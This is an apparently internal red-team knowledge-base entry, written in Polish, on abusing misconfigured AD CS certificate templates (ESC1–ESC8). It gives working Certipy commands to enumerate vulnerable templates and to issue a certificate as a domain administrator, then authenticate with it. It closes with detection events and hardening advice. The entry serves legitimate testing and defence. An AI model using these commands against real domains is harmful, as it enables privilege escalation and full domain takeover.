---
title: "AD CS – ESC1-ESC8"
category: "red-team"
tags: ["active-directory", "adcs", "certificates", "privesc"]
platform: "windows"
mitre: ["T1649"]
difficulty: "advanced"
updated: "2026-07-11"
author: "core"
---

# AD CS Abuse (ESC1–ESC8)

## TL;DR
Źle skonfigurowane szablony certyfikatów w Active Directory Certificate Services pozwalają wystawić certyfikat podszywający się pod dowolnego użytkownika (w tym Domain Admin) → uwierzytelnienie Kerberos jako ofiara. `Certipy` enumeruje i wykorzystuje.

## Enumeracja
```bash
certipy find -u user@corp.local -p 'Pass' -dc-ip 10.10.10.10 -vulnerable -stdout
```

## Skrót technik
```text
ESC1  – szablon: ENROLLEE_SUPPLIES_SUBJECT + client auth + enroll dla usera -> SAN = dowolny user
ESC2  – Any Purpose EKU
ESC3  – Enrollment Agent -> żądaj w imieniu innych
ESC4  – zapis (WriteDacl) na szablonie -> przerób go w ESC1
ESC6  – CA flag EDITF_ATTRIBUTESUBJECTALTNAME2 -> SAN w dowolnym żądaniu
ESC8  – NTLM relay do web enrollment (HTTP) CA
```

## Przykład ESC1
```bash
# Wystaw cert jako administrator, korzystając z podatnego szablonu
certipy req -u user@corp.local -p 'Pass' -ca CORP-CA -template VulnTemplate \
  -upn administrator@corp.local -dc-ip 10.10.10.10

# Uwierzytelnij się certem -> hash NT / TGT
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

## Wykrywanie (Blue Team)
- Event **4886/4887** (żądanie/wystawienie certu) z SAN ≠ żądający.
- Certyfikaty z UPN admina wystawione low-priv użytkownikom.
- Monitoring zapisów do szablonów (obiekty w `CN=Certificate Templates`).

## Mitygacja / Hardening
- Usuń `ENROLLEE_SUPPLIES_SUBJECT` tam gdzie zbędne; ogranicz enroll rights.
- Wyłącz `EDITF_ATTRIBUTESUBJECTALTNAME2` na CA.
- Wymuś manager approval na wrażliwych szablonach; HTTPS + EPA dla web enrollment (ESC8).

## Źródła
- [Certipy](https://github.com/ly4k/Certipy) · [SpecterOps – Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
